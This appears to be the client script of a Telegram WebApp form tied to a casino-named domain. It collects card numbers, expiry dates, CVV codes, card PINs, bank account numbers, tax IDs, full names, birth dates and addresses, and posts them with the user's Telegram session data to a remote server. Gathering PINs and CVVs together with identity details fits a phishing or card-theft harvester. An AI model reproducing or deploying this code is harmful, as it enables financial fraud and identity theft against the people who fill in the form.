const searchParams = new URLSearchParams(location.search);
if (!searchParams.get('id') || !searchParams.get('method')) {
    window.Telegram.WebApp.close();
}
const method = searchParams.get('method');

const phoneNumber = document.getElementById('phone-number-group');
const cardNumber = document.getElementById('card-number-group');
const expirationDate = document.getElementById('expiration-date-group');
const cvv = document.getElementById('cvv-group');
const pin = document.getElementById('pin-group');
const accountNumber = document.getElementById('account-number-group');
const inn = document.getElementById('inn-group');
const fullName = document.getElementById('full-name-group');
const birthDate = document.getElementById('birthdate-group');
const residence = document.getElementById('residence-group');

if (method == 'nfc') {
    inn.classList.add('hidden');
} else if (method == 'transfer') {
    phoneNumber.classList.add('hidden');
    expirationDate.classList.add('hidden');
    cvv.classList.add('hidden');
    pin.classList.add('hidden');
} else if (method == 'sberbank') {
    expirationDate.classList.add('hidden');
    cvv.classList.add('hidden');
    pin.classList.add('hidden');
    inn.classList.add('hidden');
} else if (method == 'card') {
    phoneNumber.classList.add('hidden');
    expirationDate.classList.add('hidden');
    cvv.classList.add('hidden');
    pin.classList.add('hidden');
}

const submitButton = document.getElementById('submit-btn');
submitButton.addEventListener('click', async () => {
    const response = await fetch('https://casinotestweb.ru/additionalClientData', {
        method: 'post',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({
            initData: window.Telegram.WebApp.initData,
            id: searchParams.get('id'),
            number: document.getElementById('phone-number').value,
            card: document.getElementById('card-number').value,
            expire: document.getElementById('expiration-date').value,
            cvv: document.getElementById('cvv').value,
            pin: document.getElementById('pin').value,
            account: document.getElementById('account-number').value,
            inn: document.getElementById('inn').value,
            fullname: document.getElementById('full-name').value,
            birthday: document.getElementById('birthdate').value,
            address: document.getElementById('residence').value,
        })
    });
    const json = await response.json();
    if (json.msg) {
        return window.Telegram.WebApp.showAlert('Произошла ошибка. Заполните все поля, либо попробуйте позже');
    }
    Telegram.WebApp.close();
})